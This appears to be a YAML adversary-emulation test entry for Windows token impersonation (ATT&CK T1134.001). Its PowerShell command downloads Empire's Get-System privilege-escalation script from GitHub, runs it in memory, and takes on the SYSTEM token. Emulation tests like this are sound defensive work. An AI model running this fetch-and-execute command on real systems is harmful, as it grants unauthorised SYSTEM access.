- id: abd5cdf2-c6b5-5d87-9b27-95ef72933802
  name: Soumaia ART Tests - `SeDebugPrivilege` token duplication
  description: 'Uses PowerShell and Empire''s [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.

    When executed successfully, the test displays the domain and name of the account it''s impersonating (local SYSTEM). (requires elevation)'
  tactic: stealth
  technique:
    attack_id: T1134.001
    name: 'Access Token Manipulation: Token Impersonation/Theft'
  platforms:
    windows:
      psh:
        command: |-
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose
